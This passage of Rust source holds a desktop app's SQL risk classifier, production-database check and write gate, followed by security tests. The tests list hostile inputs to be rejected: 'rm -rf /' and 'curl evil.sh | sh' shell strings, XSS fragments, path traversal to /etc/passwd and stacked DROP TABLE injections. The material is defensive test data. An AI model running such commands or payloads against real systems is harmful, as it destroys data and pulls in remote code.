        SqlStatementKind::Other | SqlStatementKind::None => SqlRiskClass::Unknown,
    };
    (kind, class)
}

/// SQL 风险分类（**唯一入口**，命令层与核心层都必须先过这里）。
///
/// 顺序即优先级（任一步失败立即返回，绝不继续）：
///   1. 空语句 ⇒ `DB_SQL_EMPTY`
///   2. 超 `DB_MAX_SQL_BYTES` ⇒ `DB_SQL_TOO_LARGE`
///   3. 注释/引号未闭合 ⇒ `DB_SQL_PARSE_FAILED`（fail-closed）
///   4. 掩蔽后按 `;` 切分：**批中只要多于一条语句就整批拒绝** ⇒ `DB_MULTIPLE_STATEMENTS`
///      （G-4.2：看首条等于放行后半段）
///   5. 单条语句分类；不认识的动词 ⇒ `DB_SQL_PARSE_FAILED`（**不可解析即拒**）
pub fn classify_sql_risk(sql: &str) -> SqlClassification {
    let reject = |code: DbErrorCode, kind: SqlStatementKind, count: usize| SqlClassification {
        class: SqlRiskClass::Unknown,
        kind,
        statement_count: count,
        error: Some(code),
    };

    if sql.trim().is_empty() {
        return reject(DbErrorCode::SqlEmpty, SqlStatementKind::None, 0);
    }
    if sql.len() > DB_MAX_SQL_BYTES {
        return reject(DbErrorCode::SqlTooLarge, SqlStatementKind::None, 0);
    }

    let masked = match mask_literals_and_comments(sql) {
        Ok(m) => m,
        Err(_) => return reject(DbErrorCode::SqlParseFailed, SqlStatementKind::None, 0),
    };

    let statements: Vec<&str> = masked
        .split(';')
        .map(|s| s.trim())
        .filter(|s| !s.is_empty())
        .collect();
    let count = statements.len();
    if count == 0 {
        return reject(DbErrorCode::SqlEmpty, SqlStatementKind::None, 0);
    }
    if count > 1 {
        // 多语句：整批拒绝，但仍回填首条语句类型，便于审计区分「误加 ;」与「恶意堆叠」。
        let (kind, _) = classify_statement(&depth0_words(statements[0]));
        return reject(DbErrorCode::MultipleStatements, kind, count);
    }

    let words = depth0_words(statements[0]);
    let (kind, class) = classify_statement(&words);
    let error = if matches!(class, SqlRiskClass::Unknown) {
        Some(DbErrorCode::SqlParseFailed)
    } else {
        None
    };
    SqlClassification {
        class,
        kind,
        statement_count: count,
        error,
    }
}

/// 是否属于「写或更危险」的语句（A1 展开卡既定 API 名）。
///
/// **fail-closed**：空 / 超长 / 不可解析 / 多语句 / DDL / 权限类一律算「写」，
/// 调用方只能用它来**拒绝**，不能反过来用它放行。
pub fn is_write_statement(sql: &str) -> bool {
    classify_sql_risk(sql).is_write_like()
}

/// 生产判定结果（M4-1.d §3.1，A10 G-5）。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ProductionVerdict {
    Production,
    NonProduction,
    /// 信息不足以判定。**按生产处理**（拒绝写）——G-5 的核心，不是「放行」。
    Unknown,
}

/// 生产判定输入信号（**全部由调用方预先算好**，本模块不做 DNS / 连接 / IO）。
///
/// 之所以不在本模块解析主机：一旦引入 IO，分类器就不再是可先于数据库实现合入的
/// 纯函数，也违背了 F4 的零 db 依赖约束。
#[derive(Debug, Clone, Copy)]
pub struct ProductionSignals<'a> {
    /// SQLite 本地文件库（无网络端口）
    pub is_sqlite: bool,
    /// 远端主机名；SQLite 传 `None`
    pub host: Option<&'a str>,
    /// SQLite = 文件路径；其余 = 库名
    pub database: &'a str,
    /// 用户显式标记（**S1**）：`Some(true)` 直接判生产
    pub production_hint: Option<bool>,
    /// 主机是否解析到回环/私有网段（**S3**）。`None` = 未解析/不可解析（**S5**）。
    /// SQLite 本地文件若调用方认为等价回环，应显式传 `Some(true)`。
    pub host_is_loopback_or_private: Option<bool>,
    /// 连接**实际**是否加密（**S4**）。`None` = 未知。
    pub encrypted: Option<bool>,
}

/// 名称是否命中词表（子串匹配，大小写不敏感）。
fn name_hits(value: &str, hints: &[&str]) -> bool {
    let lower = value.to_ascii_lowercase();
    hints.iter().any(|h| lower.contains(h))
}

/// 生产判定（M4-1.d §3.3 决策规则，顺序即优先级）。
///
/// 1. `production_hint == Some(true)` ⇒ `Production`
/// 2. 任一 Unknown 触发（S2 名称命中 / S4 非回环未加密 / S5 空库名·无主机·主机不可解析）⇒ `Unknown`
/// 3. 全部信号为 NonProduction 候选（S1=`Some(false)` / S2' 名称命中 / S3 回环私有）⇒ `NonProduction`
/// 4. **无任何信号** ⇒ `Unknown`（不是 NonProduction）
pub fn is_production_database(s: &ProductionSignals) -> ProductionVerdict {
    // 规则 1：显式生产标记
    if s.production_hint == Some(true) {
        return ProductionVerdict::Production;
    }

    let host = s.host.map(|h| h.trim()).unwrap_or("");

    // 规则 2：任一 Unknown 触发
    if s.database.trim().is_empty() {
        return ProductionVerdict::Unknown; // S5 库名为空
    }
    if name_hits(s.database, &PROD_NAME_HINTS) {
        return ProductionVerdict::Unknown; // S2 库名命中生产词表
    }
    if !s.is_sqlite {
        if host.is_empty() || s.host_is_loopback_or_private.is_none() {
            return ProductionVerdict::Unknown; // S5 无主机 / 主机不可解析
        }
        if name_hits(host, &PROD_NAME_HINTS) {
            return ProductionVerdict::Unknown; // S2 主机名命中生产词表
        }
        if s.host_is_loopback_or_private == Some(false) && s.encrypted == Some(false) {
            return ProductionVerdict::Unknown; // S4 公网地址且实际未加密
        }
    } else if s.host_is_loopback_or_private.is_none()
        && !name_hits(s.database, &NONPROD_NAME_HINTS)
        && s.production_hint != Some(false)
    {
        // SQLite 且调用方未给出拓扑信号：按契约规则 4「无任何信号 ⇒ Unknown」处理。
        // 见 `bare_sqlite_without_topology_signal_is_unknown`（fail-closed 取向，O-A4-1）。
        return ProductionVerdict::Unknown;
    }

    // 规则 3：NonProduction 候选
    let mut non_production = false;
    if s.production_hint == Some(false) {
        non_production = true;
    }
    if name_hits(host, &NONPROD_NAME_HINTS) || name_hits(s.database, &NONPROD_NAME_HINTS) {
        non_production = true;
    }
    if s.is_sqlite || s.host_is_loopback_or_private == Some(true) {
        non_production = true;
    }
    if non_production {
        return ProductionVerdict::NonProduction;
    }

    // 规则 4：无任何信号 ⇒ 按生产处理
    ProductionVerdict::Unknown
}

/// fail-closed 写闸门（M4-1.d §3.4 全链路，A1 展开卡既定 API 名）。
///
/// 放行条件（**全部**满足）：语句为 `Read`（无需闸门）**或**同时满足
/// ①类别 = `Write` ②`allow_write` ③生产判定 = `NonProduction` ④本次二次确认通过。
///
/// `Ddl` / `Admin` / `Unknown` / 任何分类错误**一律拒绝**——首期只给「数据写」
/// 一条放行通道，结构变更与权限类不开放。
pub fn require_write_confirmation(
    classification: &SqlClassification,
    verdict: ProductionVerdict,
    allow_write: bool,
    confirmed: bool,
) -> Result<(), DbErrorCode> {
    if let Some(code) = classification.error {
        return Err(code);
    }
    match classification.class {
        SqlRiskClass::Read => Ok(()),
        SqlRiskClass::Unknown => Err(DbErrorCode::SqlParseFailed),
        SqlRiskClass::Ddl | SqlRiskClass::Admin => Err(DbErrorCode::WriteDenied),
        SqlRiskClass::Write => {
            if !allow_write {
                return Err(DbErrorCode::WriteDenied);
            }
            match verdict {
                ProductionVerdict::Production => Err(DbErrorCode::WriteDenied),
                ProductionVerdict::Unknown => Err(DbErrorCode::ProductionUnknown),
                ProductionVerdict::NonProduction => {
                    if confirmed {
                        Ok(())
                    } else {
                        Err(DbErrorCode::WriteDenied)
                    }
                }
            }
        }
    }
}

/// 主机是否落在回环 / 私网。**只能判定可解析的 IP**；域名或留空返回 `None`，
/// 调用方按「未知 → 生产」处理（fail-closed，绝不降级当成未加密/公网放行）。
pub fn host_is_loopback_or_private_ip(host: &str) -> Option<bool> {
    use std::net::IpAddr;
    match host.parse::<IpAddr>() {
        Ok(IpAddr::V4(ip)) => Some(ip.is_loopback() || ip.is_private()),
        Ok(IpAddr::V6(ip)) => Some(ip.is_loopback() || ip.is_unique_local() || ip.is_unspecified()),
        Err(_) => None,
    }
}

/// 由连接配置 + 传输层加密状态构造生产判定信号。纯函数，便于命令层与测试复用。
pub fn build_db_signals(
    cfg: &DbConnectionConfig,
    encrypted: Option<bool>,
) -> ProductionSignals<'_> {
    ProductionSignals {
        is_sqlite: matches!(cfg.kind, SupportedDb::Sqlite),
        host: cfg.host.as_deref(),
        database: &cfg.database,
        production_hint: cfg.production_hint,
        host_is_loopback_or_private: cfg.host.as_deref().and_then(host_is_loopback_or_private_ip),
        encrypted,
    }
}

/// 命令层写闸门组合（A3 的 `DbPool::query` 不判写，写闸门全链路归本函数）。
///
/// `db_query` 在**任何语句实际执行前**必须过这一关，且任一步拒绝即短路返回，
/// 绝不降级放行（F1 / F4 / 契约 G-4 / G-5）。返回 `Err(DbErrorCode)` 时由命令层
/// 映射为稳定字符串码（`code.as_str()`）回前端。
pub fn evaluate_db_query_gate(
    sql: &str,
    cfg: &DbConnectionConfig,
    encrypted: Option<bool>,
    confirm_write: bool,
) -> Result<(), DbErrorCode> {
    let classification = classify_sql_risk(sql);
    let signals = build_db_signals(cfg, encrypted);
    let verdict = is_production_database(&signals);
    require_write_confirmation(&classification, verdict, cfg.allow_write, confirm_write)
}

/// 便捷入口：把「路径 + 用户意图」合成一次判定（M0-3.b 收口远程 IPC 时使用）。
pub struct Decision {
    pub allowed: bool,
    pub reason: Option<PolicyError>,
}

impl Decision {
    pub fn allow() -> Self {
        Self {
            allowed: true,
            reason: None,
        }
    }
    pub fn deny(reason: PolicyError) -> Self {
        Self {
            allowed: false,
            reason: Some(reason),
        }
    }
}

#[cfg(test)]
mod security_policy_tests {
    use super::*;
    use std::fs;

    fn temp_root(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("m0-3a-{}-{}", tag, std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).expect("创建临时根目录");
        dir
    }

    // ---------- webview label ----------

    #[test]
    fn known_labels_are_accepted() {
        for label in ["main", "tab-8f2c", "grid-0", "grid-child-3"] {
            assert!(
                check_webview_label(label).is_ok(),
                "{label} 应属于已登记 label"
            );
        }
    }

    #[test]
    fn stale_browser_label_is_rejected() {
        // 威胁矩阵 SEC-03：capabilities 里仍残留 `browser`，产品已无此 label。
        assert!(!is_known_webview_label("browser"));
        assert_eq!(
            check_webview_label("browser"),
            Err(PolicyError::UnknownWebviewLabel("browser".to_string()))
        );
    }

    // ---------- 路径边界 ----------

    #[test]
    fn path_inside_allowed_root_is_accepted() {
        let root = temp_root("inside");
        let file = root.join("a.txt");
        fs::write(&file, "x").expect("写入");
        let roots = vec![root.clone()];
        let resolved = check_path_within_roots(file.to_str().unwrap(), &roots)
            .expect("允许根目录内的路径应放行");
        assert!(resolved.starts_with(&root));
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn parent_traversal_is_rejected() {
        let root = temp_root("traversal");
        fs::create_dir_all(root.join("sub")).expect("创建子目录");
        let escape = root.join("sub").join("..").join("..").join("etc");
        let roots = vec![root.clone()];
        let err = check_path_within_roots(escape.to_str().unwrap(), &roots)
            .expect_err("../ 逃逸必须被拒绝");
        assert!(
            matches!(err, PolicyError::PathOutsideAllowedRoots { .. })
                || matches!(err, PolicyError::UnresolvablePath(_)),
            "实际错误：{err:?}"
        );
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn symlink_escape_is_rejected() {
        let root = temp_root("symlink");
        let outside = temp_root("symlink-outside");
        let link = root.join("escape-link");
        #[cfg(unix)]
        std::os::unix::fs::symlink(&outside, &link).expect("创建符号链接");
        #[cfg(not(unix))]
        {
            let _ = (&outside, &link);
            return; // 非 Unix 无符号链接语义，跳过
        }
        let roots = vec![root.clone()];
        let err = check_path_within_roots(link.to_str().unwrap(), &roots)
            .expect_err("符号链接逃逸必须被拒绝");
        assert!(
            matches!(err, PolicyError::SymlinkEscape { .. })
                || matches!(err, PolicyError::PathOutsideAllowedRoots { .. }),
            "实际错误：{err:?}"
        );
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&outside);
    }

    #[test]
    fn empty_roots_deny_everything() {
        let root = temp_root("empty-roots");
        let file = root.join("a.txt");
        fs::write(&file, "x").expect("写入");
        let err = check_path_within_roots(file.to_str().unwrap(), &[])
            .expect_err("未配置允许根目录时默认拒绝");
        assert!(matches!(err, PolicyError::PathOutsideAllowedRoots { .. }));
        let _ = fs::remove_dir_all(&root);
    }

    // ---------- shell 命令 ----------

    #[test]
    fn plain_commands_are_accepted() {
        for cmd in ["/usr/bin/code", "code", "google-chrome --new-window"] {
            assert!(check_shell_command(cmd).is_ok(), "{cmd} 不含元字符，应放行");
        }
    }

    #[test]
    fn shell_metacharacters_are_rejected() {
        for cmd in [
            "code; rm -rf /",
            "code && curl evil.sh | sh",
            "code `whoami`",
            "code $(id)",
            "code > /etc/passwd",
            "code\nrm -rf /",
        ] {
            let err = check_shell_command(cmd).expect_err("含元字符的命令必须被拒绝");
            assert!(
                matches!(err, PolicyError::ShellMetacharacter { .. }),
                "{cmd} 应判为元字符，实际：{err:?}"
            );
        }
        assert_eq!(check_shell_command("   "), Err(PolicyError::EmptyCommand));
    }

    // ---------- HTML ----------

    #[test]
    fn oversized_html_is_rejected() {
        let huge = "a".repeat(MAX_HTML_BYTES + 1);
        assert!(matches!(
            check_html(&huge),
            Err(PolicyError::HtmlTooLarge { .. })
        ));
    }

    #[test]
    fn dangerous_html_fragments_are_rejected() {
        for html in [
            "<script>alert(1)</script>",
            "<a href=\"javascript:alert(1)\">x</a>",
            "<iframe src=\"https://evil\"></iframe>",
            "<img src=x onerror=alert(1)>",
        ] {
            assert!(
                matches!(check_html(html), Err(PolicyError::DangerousHtml(_))),
                "{html} 必须被拒绝"
            );
        }
        assert!(check_html("<div>安全内容</div>").is_ok());
    }

    // ---------- M0-3.b：来源 / 用户意图 / 载荷边界 ----------

    #[test]
    fn main_window_invocation_needs_no_intent_token() {
        let registry = IntentRegistry::new();
        // 主窗口 UI 的点击本身就是用户手势的结果，不需要令牌。
        assert!(check_remote_invocation("main", INTENT_SAVE_NOTE, None, &registry).is_ok());
    }

    #[test]
    fn remote_invocation_without_token_is_rejected() {
        let registry = IntentRegistry::new();
        let err = check_remote_invocation("tab-1", INTENT_SAVE_NOTE, None, &registry)
            .expect_err("外部页面无令牌写入必须被拒绝");
        assert_eq!(
            err,
            PolicyError::MissingUserIntent {
                scope: INTENT_SAVE_NOTE.to_string()
            }
        );
    }

    #[test]
    fn stale_browser_label_invocation_is_rejected() {
        let registry = IntentRegistry::new();
        let token = registry.issue(INTENT_SAVE_NOTE, INTENT_TTL);
        // 即使带了合法令牌，未登记 label 也要被拒绝（SEC-03）。
        assert!(
            check_remote_invocation("browser", INTENT_SAVE_NOTE, Some(&token), &registry).is_err()
        );
    }

    #[test]
    fn intent_token_is_one_shot_and_scope_bound() {
        let registry = IntentRegistry::new();
        let token = registry.issue(INTENT_SAVE_NOTE, INTENT_TTL);
        assert!(
            check_remote_invocation("tab-1", INTENT_SAVE_NOTE, Some(&token), &registry).is_ok()
        );
        // 重放：第二次必须失败。
        assert!(
            check_remote_invocation("tab-1", INTENT_SAVE_NOTE, Some(&token), &registry).is_err(),
            "令牌必须一次性"
        );
        // 串作用域：save_note 的令牌不能用来开终端，且必须被消费掉（不得残留）。
        let other = registry.issue(INTENT_SAVE_NOTE, INTENT_TTL);
        assert!(
            check_remote_invocation("tab-1", INTENT_OPEN_TERMINAL, Some(&other), &registry)
                .is_err(),
            "作用域不匹配的令牌必须被拒绝"
        );
        assert_eq!(
            registry.pending(),
            0,
            "被拒绝的令牌也必须出表，避免无效令牌堆积"
        );
    }

    #[test]
    fn expired_intent_token_is_rejected() {
        let registry = IntentRegistry::new();
        let token = registry.issue(
            INTENT_COLLECT_SELECTION,
            std::time::Duration::from_millis(0),
        );
        std::thread::sleep(std::time::Duration::from_millis(5));
        assert_eq!(
            registry.consume(INTENT_COLLECT_SELECTION, &token),
            Err(PolicyError::ExpiredUserIntent {
                scope: INTENT_COLLECT_SELECTION.to_string()
            })
        );
    }

    #[test]
    fn oversized_and_bulk_payloads_are_rejected() {
        let huge = "x".repeat(MAX_TEXT_FIELD_BYTES + 1);
        assert!(matches!(
            check_text_field("text", &huge, MAX_TEXT_FIELD_BYTES),
            Err(PolicyError::PayloadTooLarge { .. })
        ));
        assert!(check_text_field("text", "正常长度", MAX_TEXT_FIELD_BYTES).is_ok());
        assert!(matches!(
            check_items_count(MAX_RESOURCE_ITEMS + 1, MAX_RESOURCE_ITEMS),
            Err(PolicyError::TooManyItems { .. })
        ));
        assert!(check_items_count(MAX_RESOURCE_ITEMS, MAX_RESOURCE_ITEMS).is_ok());
    }

    // ---------- M0-3.c：写路径收口 ----------

    #[test]
    fn path_components_with_traversal_are_rejected() {
        for bad in ["..", ".", "../../etc/passwd", "a/b", "a\\b", "a\0b", "  "] {
            assert!(
                check_path_component(bad).is_err(),
                "路径分量 {bad:?} 必须被拒绝"
            );
        }
        assert!(check_path_component("正常文件名.md").is_ok());
    }

    #[test]
    fn deleting_an_allowed_root_itself_is_refused() {
        let root = temp_root("root-guard");
        let file = root.join("a.txt");
        fs::write(&file, "x").expect("写入");
        let roots = vec![root.clone()];
        // 根目录本身不允许删（防一次调用清空工作区/主目录）。
        assert!(matches!(
            check_delete_target(root.to_str().unwrap(), &roots),
            Err(PolicyError::RefuseToDeleteRoot { .. })
        ));
        // 根目录内的普通文件允许删。
        assert!(check_delete_target(file.to_str().unwrap(), &roots).is_ok());
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn only_http_and_https_urls_can_be_opened() {
        for ok in ["https://example.com/a", "http://example.com"] {
            assert!(check_openable_url(ok).is_ok(), "{ok} 应放行");
        }
        for bad in [
            "file:///etc/passwd",
            "smb://evil/share",
            "/bin/sh",
            "ftp://x",
        ] {
            assert!(check_openable_url(bad).is_err(), "{bad} 必须被拒绝");
        }
    }

    #[test]
    fn root_membership_helper_matches_path_check() {
        let root = temp_root("membership");
        let nested = root.join("sub");
        fs::create_dir_all(&nested).expect("创建");
        let file = nested.join("a.txt");
        fs::write(&file, "x").expect("写入");
        let roots = vec![root.clone()];
        let canonical =
            check_path_within_roots(file.to_str().unwrap(), &roots).expect("根目录内应放行");
        assert!(is_within_roots(&canonical, &roots));
        assert!(!is_within_roots(
            std::path::Path::new("/etc/passwd"),
            &roots
        ));
        let _ = fs::remove_dir_all(&root);
    }

    // ---------- M0-3.d：启动目标解析 ----------

    #[test]
    fn command_line_is_split_into_program_and_args() {
        let (p, a) = parse_command_line("code").expect("单程序");
        assert_eq!(p, "code");
        assert!(a.is_empty());
        let (p, a) = parse_command_line("code --new-window /tmp/a").expect("带参数");
        assert_eq!(p, "code");
        assert_eq!(a, vec!["--new-window", "/tmp/a"]);
    }

    #[test]
    fn desktop_field_codes_are_stripped() {
        let (p, a) = parse_command_line("code %U --flag %f").expect("解析");
        assert_eq!(p, "code");
        assert_eq!(a, vec!["--flag"], "字段码必须被剔除");
    }

    #[test]
    fn quoted_program_paths_are_preserved() {
        let (p, a) = parse_command_line("\"/opt/My App/app\" --x").expect("解析");
        assert_eq!(p, "/opt/My App/app", "引号内空白不得切开");
        assert_eq!(a, vec!["--x"]);
    }

    #[test]
    fn shell_interpreters_are_blocked_as_launch_targets() {
        for cmd in ["sh", "bash -c 'id'", "/bin/bash", "powershell -c x", "zsh"] {
            let err = check_launch_target(cmd)
                .expect_err("shell 解释器不得作为启动目标（等价于绕过 sh -c 收口）");
            assert!(
                matches!(err, PolicyError::BlockedLaunchProgram(_)),
                "{cmd} 实际错误：{err:?}"
            );
        }
    }

    #[test]
    fn metacharacters_and_unknown_programs_are_rejected() {
        assert!(matches!(
            check_launch_target("true; rm -rf /"),
            Err(PolicyError::ShellMetacharacter { .. })
        ));
        assert!(matches!(
            check_launch_target("definitely-not-a-real-program-xyz"),
            Err(PolicyError::LaunchProgramNotFound(_))
        ));
        assert!(check_launch_target("").is_err());
    }

    #[test]
    fn resolvable_program_is_accepted() {
        // 用 /proc 下的确定可执行文件验证「绝对路径 + 存在性」分支。
        let path = "/proc/self/exe";
        assert!(std::path::Path::new(path).is_file());
        let (p, a) = parse_command_line(path).expect("解析");
        assert_eq!(p, path);
        assert!(a.is_empty());
    }

    // ---------- M1-8：资源瀑布 URL 脱敏 ----------

    #[test]
    fn sensitive_query_params_are_redacted() {
        let out = redact_sensitive_url(
            "https://api.example.com/cb?token=abc123&ok=1&password=hunter2&Signature=SIG",
        );
        assert!(out.contains("token=%2A%2A%2A") || out.contains("token=***"));
        assert!(out.contains("ok=1"), "非敏感参数必须保留: {out}");
        assert!(!out.contains("abc123"), "token 原值不得出现: {out}");
        assert!(!out.contains("hunter2"), "password 原值不得出现: {out}");
        assert!(!out.contains("SIG"), "signature 原值不得出现: {out}");
        for key in [
            "access_token",
            "refresh_token",
            "id_token",
            "secret",
            "session",
            "cookie",
            "jwt",
            "api_key",
        ] {
            assert!(is_sensitive_query_key(key), "{key} 应判定为敏感");
        }
        assert!(!is_sensitive_query_key("page"));
    }

    #[test]
    fn userinfo_and_fragment_credentials_are_redacted() {
        let out = redact_sensitive_url("https://user:passw0rd@example.com/a#access_token=zzz&x=1");
        assert!(!out.contains("passw0rd"), "userinfo 密码不得出现: {out}");
        assert!(!out.contains("user@"), "userinfo 用户名不得出现: {out}");
        assert!(!out.contains("zzz"), "fragment 中的 token 不得出现: {out}");
        assert!(out.contains("x=1"), "fragment 非敏感参数保留: {out}");
    }

    #[test]
    fn oversized_url_is_truncated() {
        let long = format!(
            "https://example.com/{}",
            "a".repeat(MAX_RESOURCE_URL_BYTES + 100)
        );
        let out = redact_sensitive_url(&long);
        assert!(out.len() <= MAX_RESOURCE_URL_BYTES + 4, "截断后仍超限");
        assert!(out.ends_with('…'));
    }

    #[test]
    fn non_absolute_url_falls_back_to_truncation_only() {
        let out = redact_sensitive_url("not a url at all");
        assert_eq!(out, "not a url at all");
    }

    #[test]
    fn decision_helpers_carry_reason() {
        let allow = Decision::allow();
        assert!(allow.allowed && allow.reason.is_none());
        let deny = Decision::deny(PolicyError::EmptyCommand);
        assert!(!deny.allowed);
        assert_eq!(deny.reason, Some(PolicyError::EmptyCommand));
        assert!(policy_fingerprint().contains("security-policy-v2"));
    }
}

// ===========================================================================
// M4-2.s 数据库安全闸门测试
//
// 用例编号沿用 A1 展开卡 §5 的 `N-sql-1~N-sql-16` 段（写在每条测试的注释里）。
// 取向：**以失败用例为主**，并保留反向用例防止「fail-closed 过头」误伤正常只读查询
// （同 M2-3 `T-scr` 口径）。`check-database-policy.py` 的 `DB_SQL_PARSE_FAIL_CLOSED`
// 会扫描本模块，删除下列任一测试都会让 pre-merge 变红。
// ===========================================================================
#[cfg(test)]
mod m4_2_s_database_safety_tests {
    use super::*;

    fn remote<'a>(host: &'a str, database: &'a str) -> ProductionSignals<'a> {
        ProductionSignals {
            is_sqlite: false,
            host: Some(host),
            database,
            production_hint: None,
            host_is_loopback_or_private: Some(false),
            encrypted: Some(true),
        }
    }

    // ---------- 分类器：失败用例 ----------

    #[test]
    fn empty_sql_is_rejected() {
        // N-sql-1：空语句与纯空白
        assert_eq!(
            classify_sql_risk("").error,
            Some(DbErrorCode::SqlEmpty),
            "空 SQL 必须拒绝"
        );
        assert_eq!(
            classify_sql_risk("   \n\t ").error,
            Some(DbErrorCode::SqlEmpty)
        );
        assert!(is_write_statement(""));
    }

    #[test]
    fn oversized_sql_is_rejected() {
        // N-sql-2：超过 DB_MAX_SQL_BYTES
        let huge = format!("SELECT {};", "x".repeat(DB_MAX_SQL_BYTES));
        assert_eq!(
            classify_sql_risk(&huge).error,
            Some(DbErrorCode::SqlTooLarge)
        );
        let ok = format!("SELECT {};", "x".repeat(DB_MAX_SQL_BYTES - 16));
        assert!(classify_sql_risk(&ok).is_read_only(), "未超限的查询应放行");
    }

    #[test]
    fn unterminated_block_comment_is_unparsable() {
        // N-sql-3：未闭合块注释 ⇒ 不可解析即拒
        assert_eq!(
            classify_sql_risk("SELECT 1 /* oops").error,
            Some(DbErrorCode::SqlParseFailed)
        );
    }

    #[test]
    fn unterminated_string_literal_is_unparsable() {
        // N-sql-4：未闭合单引号 ⇒ 不可解析即拒
        assert_eq!(
            classify_sql_risk("SELECT 'abc").error,
            Some(DbErrorCode::SqlParseFailed)
        );
    }

    #[test]
    fn stacked_drop_is_rejected_as_multiple_statements() {
        // N-sql-5：`SELECT 1; DROP TABLE t;` 必须整批拒绝（G-4.2）
        let c = classify_sql_risk("SELECT 1; DROP TABLE t;");
        assert_eq!(c.error, Some(DbErrorCode::MultipleStatements));
        assert_eq!(c.statement_count, 2);
        assert!(c.is_write_like(), "多语句绝不能当只读");
    }

    #[test]
    fn comment_wrapped_delete_is_rejected() {
        // N-sql-6：注释包裹不能绕过
        let c = classify_sql_risk("/*x*/ DELETE FROM t");
        assert_eq!(c.class, SqlRiskClass::Write);
        assert_eq!(c.kind, SqlStatementKind::Delete);
    }

    #[test]
    fn cte_delete_is_rejected() {
        // N-sql-7：CTE 之后的主动词才是判定依据（首关键字是 WITH）
        let c = classify_sql_risk("WITH t AS (SELECT 1) DELETE FROM t");
        assert_eq!(c.kind, SqlStatementKind::Delete);
        assert_eq!(c.class, SqlRiskClass::Write);
    }

    #[test]
    fn mixed_case_ddl_is_rejected() {
        // N-sql-8：大小写变形不能绕过
        let c = classify_sql_risk("dRoP TaBlE t");
        assert_eq!(c.class, SqlRiskClass::Ddl);
        assert_eq!(c.kind, SqlStatementKind::Drop);
    }

    #[test]
    fn update_without_where_is_still_write() {
        // N-sql-9：无 WHERE 的 UPDATE 仍是 Write（由写闸门拦，不靠分类器宽松）
        let c = classify_sql_risk("UPDATE users SET admin = 1");
        assert_eq!(c.class, SqlRiskClass::Write);
        assert_eq!(c.kind, SqlStatementKind::Update);
    }

    #[test]
    fn select_into_outfile_is_treated_as_write() {
        // N-sql-10：`SELECT ... INTO OUTFILE` 在服务端写文件，按写处理
        let c = classify_sql_risk("SELECT * FROM t INTO OUTFILE '/tmp/leak.csv'");
        assert_eq!(c.class, SqlRiskClass::Write);
    }

    #[test]
    fn explain_analyze_is_not_treated_as_read() {
        // N-sql-11：MySQL 8 的 `EXPLAIN ANALYZE <DML>` 会真实执行
        let c = classify_sql_risk("EXPLAIN ANALYZE UPDATE t SET a = 1");
        assert_eq!(c.class, SqlRiskClass::Admin);
        assert!(!c.is_read_only());
    }

    #[test]
    fn unknown_verb_is_rejected() {
        // N-sql-12：不认识的动词 ⇒ 不可解析 ⇒ 拒绝（不降级放行）
        let c = classify_sql_risk("VACUUM FULL");
        assert_eq!(c.class, SqlRiskClass::Unknown);
        assert_eq!(c.error, Some(DbErrorCode::SqlParseFailed));
    }

    #[test]
    fn grant_and_copy_are_admin_class() {
        // N-sql-13：权限/运维类一律 Admin，永不放行
        assert_eq!(
            classify_sql_risk("GRANT ALL ON db.* TO 'u'@'%'").class,
            SqlRiskClass::Admin
        );
        assert_eq!(
            classify_sql_risk("COPY t FROM STDIN WITH PASSWORD 'x'").class,
            SqlRiskClass::Admin
        );
        assert_eq!(classify_sql_risk("BEGIN").class, SqlRiskClass::Admin);
    }

    #[test]
    fn truncate_is_ddl_class() {
        // N-sql-14：`TRUNCATE` 属 DDL，写闸门不得放行
        let c = classify_sql_risk("TRUNCATE TABLE t");
        assert_eq!(c.class, SqlRiskClass::Ddl);
    }

    // ---------- 分类器：反向用例（防 fail-closed 过头） ----------

    #[test]
    fn trailing_semicolon_is_single_statement() {
        // N-sql-15：`SELECT 1;` 是单条语句，不得判为多语句
        let c = classify_sql_risk("SELECT 1;");
        assert_eq!(c.statement_count, 1);
        assert!(c.is_read_only());
    }

    #[test]
    fn semicolon_inside_literal_does_not_split() {
        // N-sql-16：字符串里的 `;` 不是语句边界
        let c = classify_sql_risk("SELECT ';' AS semi FROM t");
        assert_eq!(c.statement_count, 1);
        assert!(c.is_read_only());
    }

    #[test]
    fn cte_select_is_allowed() {
        let c = classify_sql_risk("WITH t AS (SELECT 1 AS a) SELECT * FROM t");
        assert_eq!(c.kind, SqlStatementKind::Select);
        assert!(c.is_read_only());
    }

    #[test]
    fn chinese_and_comment_read_query_is_allowed() {
        // 反向用例：中文标识符/字面量与行注释不得被误判（M2-3 T-scr 同口径）
        let c = classify_sql_risk("SELECT 姓名, 部门 FROM 员工 WHERE 部门 = '研发' -- 只读查询");
        assert_eq!(c.class, SqlRiskClass::Read);
        assert!(c.is_read_only());
    }

    #[test]
    fn lower_case_select_and_show_are_read() {
        assert!(classify_sql_risk("select * from t where a = 1").is_read_only());
        assert!(classify_sql_risk("SHOW TABLES").is_read_only());
    }

    #[test]
    fn dollar_quoted_postgres_body_is_masked() {
        // Postgres 美元引用里的关键字与分号不得影响判定
        let c = classify_sql_risk("SELECT $$; DROP TABLE t;$$ AS body");
        assert_eq!(c.statement_count, 1);
        assert!(c.is_read_only());
    }

    // ---------- 生产判定（M4-1.d §3.3 与 §3.5 测试矩阵） ----------

    #[test]
    fn unresolvable_host_verdict_is_unknown() {
        let mut s = remote("db.invalid.example", "app");
        s.host_is_loopback_or_private = None;
        assert_eq!(is_production_database(&s), ProductionVerdict::Unknown);
    }

    #[test]
    fn empty_database_name_verdict_is_unknown() {
        let s = remote("127.0.0.1", "");
        assert_eq!(is_production_database(&s), ProductionVerdict::Unknown);
    }

    #[test]
    fn prod_name_only_verdict_is_unknown() {
        // 仅名称命中生产词表 ⇒ Unknown（不得单独判 Production）
        let s = remote("prod-01.corp", "app");
        assert_eq!(is_production_database(&s), ProductionVerdict::Unknown);
    }

    #[test]
    fn explicit_nonprod_hint_with_loopback_is_nonproduction() {
        let mut s = remote("127.0.0.1", "app_dev");
        s.production_hint = Some(false);
        s.host_is_loopback_or_private = Some(true);
        assert_eq!(is_production_database(&s), ProductionVerdict::NonProduction);
    }

    #[test]
    fn explicit_production_hint_is_production() {
        let mut s = remote("10.0.0.5", "app");
        s.production_hint = Some(true);
        s.host_is_loopback_or_private = Some(true);
